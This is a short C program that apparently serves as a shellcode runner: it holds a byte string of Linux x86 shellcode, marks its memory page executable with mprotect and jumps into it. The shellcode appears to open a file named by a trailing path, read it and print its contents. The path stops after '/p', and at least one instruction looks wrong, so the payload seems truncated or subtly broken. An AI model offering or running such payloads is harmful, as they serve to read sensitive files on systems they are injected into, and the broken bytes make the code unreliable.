#include <sys/mman.h>
#include <stdio.h>

unsigned char code[] = "\xeb\x28\x6a\x05\x58\x5b\x29\xc9\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe7\x89\xf9\xb4\x10\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xd3\xff\xff\xff\x2f\x70";

int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}
